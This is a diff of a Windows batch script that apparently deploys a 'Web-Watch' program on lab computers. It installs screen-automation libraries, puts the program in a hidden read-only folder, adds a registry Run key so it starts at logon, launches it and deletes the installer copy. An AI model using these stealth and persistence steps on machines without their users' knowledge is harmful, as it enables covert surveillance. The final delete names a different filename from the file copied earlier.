@@ -5,25 +5,25 @@ taskkill /f /t /im pythonw.exe
 
 pip install pywin32 pyautogui requests schedule pip-system-certs pywinauto -qqq
 
-if exist "D:\III\" (
-	rmdir /s /q "D:\III\"
-	mkdir "D:\III\"
-	attrib +h +r "D:\III\"
-	reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Web-Watch" /t REG_SZ /d "C:\Program Files\Python314\pythonw.exe D:\III\III.pyw" /f
+if exist "D:\web-watch\" (
+	rmdir /s /q "D:\web-watch\"
+	mkdir "D:\web-watch\"
+	attrib +h +r "D:\web-watch\"
+	reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Web-Watch" /t REG_SZ /d "D:\web-watch\web-watch.exe" /f
 )
 
 rem LAB 105
-if exist "C:\Users\lab136\III.pyw" move /Y "C:\Users\lab136\III.pyw" "D:\III\"
+if exist "C:\Users\lab136\web-watch.exe" copy /Y "C:\Users\lab136\web-watch.exe" "D:\web-watch\"
 
 rem LAB 106
-rem if exist "C:\Users\SENAI\III.pyw" move /Y "C:\Users\SENAI\III.pyw" "D:\III\"
+rem if exist "C:\Users\SENAI\web-watch.exe" move /Y "C:\Users\SENAI\web-watch.exe" "D:\web-watch\"
 
-cd /d "D:\III\"
+cd /d "D:\web-watch\"
 
 rem LAB 105
-start "C:\Program Files\Python314\pythonw.exe" "III.pyw"
+start "web-watch.exe"
 
 rem LAB 106
-rem start C:\Users\lab136\AppData\Local\Programs\Python\Python38\pythonw.exe "III.pyw"
+rem start "web-watch.exe"
 
-exit
+start "" /b cmd /c del "C:\Users\lab136\web_watch.exe"
